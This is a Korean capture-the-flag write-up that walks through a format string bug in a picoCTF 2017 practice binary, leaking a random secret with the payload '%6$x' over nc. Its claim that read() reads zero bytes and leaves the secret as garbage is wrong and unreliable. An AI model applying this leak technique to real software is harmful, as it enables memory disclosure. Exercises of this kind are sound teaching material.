`#FSB`
# 목차
1. [Description](#description)
2. [분석](#분석)
	1. [목표 확인](#목표-확인)
	2. [취약점 확인 (FSB)](#취약점-분석-fsb)
3. [공격 루틴](#공격-루틴)
	1. [secret 은 몇번째인지](#secret-은-몇번째인지)
4. [Flag](#flag)
## Description
> 바이너리 [secret](https://webshell2017.picoctf.com/static/2d756322664bc048224f02ad0a62a0bc/secret) 랑 [소스코드](https://webshell2017.picoctf.com/static/2d756322664bc048224f02ad0a62a0bc/secret.c)가 주어진다.  
> nc  shell2017.picoctf.com 55189  
  
```
     1  #include <stdio.h>
     2  #include <fcntl.h>
     3  #include <unistd.h>
     4  #include <stdlib.h>
     5
     6  #define BUF_LEN 64
     7  char buffer[BUF_LEN];
     8
     9  int main(int argc, char** argv) {
    10      int fd = open("/dev/urandom", O_RDONLY);
    11      if(fd == -1){
    12          puts("Open error on /dev/urandom. Contact an admin\n");
    13          return -1;
    14      }
    15      int secret;
    16      if(read(fd, &secret, sizeof(int)) != sizeof(int)){
    17          puts("Read error. Contact admin!\n");
    18          return -1;
    19      }
    20      close(fd);
    21      printf("Give me something to say!\n");
    22      fflush(stdout);
    23      fgets(buffer, BUF_LEN, stdin);
    24      printf(buffer);
    25
    26      int not_secret;
    27      printf("Now tell my secret in hex! Secret: ");
    28      fflush(stdout);
    29      scanf("%x", &not_secret);
    30      if(secret == not_secret){
    31          puts("Wow, you got it!");
    32          system("cat ./flag.txt");
    33      }else{
    34          puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    35      }
    36
    37      return 0;
    38  }
```
## 분석
### 목표 확인
```
    30      if(secret == not_secret){
    31          puts("Wow, you got it!");
    32          system("cat ./flag.txt");
    33      }
```
secret 과 not_secret 이 같아야 키값을 얻을 수 있습니다.  

```
    15      int secret;
```
secret 은 무엇이냐면  
정수형 변수이고  

```
    16      if(read(fd, &secret, sizeof(int)) != sizeof(int)){
    17          puts("Read error. Contact admin!\n");
    18          return -1;
    19      }
```
fd 라는 파일디스크립터로부터 읽어들입니다.  
그런데 read 의 매개변수 중  
세번째에 들어가는 값은 False.  
즉, size=0  
  
한마디로 한 바이트도 읽어들이지 않고  
또 초기화되지 않았으므로  
secret 에 저장되는 값은 쓰레기값 되시겠다.  
  
__if문의 조건문은 항상 False(0) 이니깐  
admin에게 연락할 일 없겠군요__  

```
    26      int not_secret;
    27      printf("Now tell my secret in hex! Secret: ");
    28      fflush(stdout);
    29      scanf("%x", &not_secret);
```
not_secret 은  
29번째 줄에서  
16진수 소문자로  
입력받는다.  

### 취약점 분석 (FSB)
```
    24      printf(buffer);
```
24번째 줄을  보면  
포맷 스트링 버그가 보입니다.  
그럼 buffer 는 어디에서 받느냐!  

```
    23      fgets(buffer, BUF_LEN, stdin);
```
fgets 에서 입력받는다.  
딱 BUF_LEN 만큼 받는데  

```
     6  #define BUF_LEN 64
```
그 크기는 64 이다.  

## 공격 루틴
아하!  
secret 에 쓰레기값이 저장되고  
24번째 줄에서 FSB로 secret 을 leak 하고  
29번째 줄에서 not_secret 에 값을 입력하면 되는구나!  

### secret 은 몇번째인지
FSB 를 사용하려면 secret 이 몇번째인지 알아야한다.  

```
# file ./secret
./secret: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=25d674d62f2f6070f9f87664bbd5b6aa5c045ef0, not stripped
```
일단 32비트 바이너리이고  

```
   0x08048636 <+75>:    lea    eax,[ebp-0x10]
   0x08048639 <+78>:    push   eax
   0x0804863a <+79>:    push   DWORD PTR [ebp-0xc]
   0x0804863d <+82>:    call   0x8048440 <read@plt>
```
32비트 바이너리는 제일 마지막에 push 되는 데이터가 첫번째 매개변수이다.  
main+75 를 보면 ebp-0x10 이 secret 이다.  

```
nc shell2017.picoctf.com 55189
Give me something to say!
%x %x %x %x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 d7838ff3 3 f7fc73c4 ffffdca0
Now tell my secret in hex! Secret:
```
```
pwndbg> stack
00:0000│ esp  0xffffd220 —▸ 0x8049b40 (buffer) ◂— 0x70257025 ('%p%p')
01:0004│      0xffffd224 ◂— 0x40 /* '@' */
02:0008│      0xffffd228 —▸ 0xf7f9b5c0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:000c│      0xffffd22c —▸ 0x8048792 (__libc_csu_init+82) ◂— add    edi, 1
04:0010│      0xffffd230 ◂— 0x1
05:0014│      0xffffd234 —▸ 0xffffd2f4 —▸ 0xffffd445 ◂— 0x746e6d2f ('/mnt')
06:0018│      0xffffd238 ◂— 0x11aad860
07:001c│      0xffffd23c ◂— 0x3
08:0020│      0xffffd240 —▸ 0xf7fe59a0 ◂— push   ebp
09:0024│      0xffffd244 —▸ 0xffffd260 ◂— 0x1
0a:0028│ ebp  0xffffd248 ◂— 0x0
```
```
pwndbg> x/wx $ebp-0x10
0xffffd238:     0x11aad860
```
비교해보니 6번째라는 것을 알았다.  

## Flag
```
# nc shell2017.picoctf.com 55189
Give me something to say!
%6$x
a6aa3c3a
Now tell my secret in hex! Secret: a6aa3c3a
a18450ba7aaa8c085c522cdef6ab35ab
Wow, you got it!
```
